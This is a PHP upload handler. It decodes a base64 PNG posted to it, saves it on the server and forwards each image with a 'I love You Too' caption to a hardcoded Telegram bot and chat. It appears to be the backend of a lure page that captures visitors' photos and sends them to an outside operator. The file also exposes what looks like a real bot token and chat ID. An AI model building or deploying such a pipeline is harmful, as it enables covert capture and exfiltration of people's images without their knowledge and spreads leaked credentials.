<?php
// Handle the image upload if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw POST data
    $data = json_decode(file_get_contents('php://input'), true);

    // Check if the image data is available
    if (isset($data['image'])) {
        $imageData = $data['image'];

        // Remove the "data:image/png;base64," part of the data URL
        $imageData = str_replace('data:image/png;base64,', '', $imageData);

        // Decode the base64 string into binary data
        $imageData = base64_decode($imageData);

        // Define the file path and name where the image will be saved
        $filePath = 'photo_' . time() . '.png';

        // Create the uploads directory if it doesn't exist
        // if (!is_dir('uploads')) {
        //     mkdir('uploads', 0777, true);
        // }

        // Save the image to the server
        if (file_put_contents($filePath, $imageData)) {
            echo json_encode(['status' => 'success', 'file' => $filePath]);

            // Send the photo to Telegram
            sendPhotoToTelegram($filePath, 'I love You Too ');

        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to save the image.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No image data received.']);
    }
    exit;
}

function sendPhotoToTelegram($filePath, $message)
{
    $botToken = '7444502388:AAEnQM_0RAYX22aMTDfldf9-UxGu350PrIw'; // Replace with your bot token
    $chatId = '5158405142';     // Replace with your chat ID

    // Telegram API URL to send photo
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";

    // Open the file for reading
    $file = new CURLFile(realpath($filePath));

    // Prepare data for POST request
    $data = [
        'chat_id' => $chatId,
        'photo' => $file,
        'caption' => $message, // Optional message to send with the image
    ];

    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute the cURL request and close the session
    $response = curl_exec($ch);
    curl_close($ch);

    // Optional: Check for errors
    if ($response === FALSE) {
        error_log("Telegram API error: " . curl_error($ch));
    } else {
        // Optional: Log the response for debugging
        // error_log("Telegram response: " . $response);
    }
}
?>
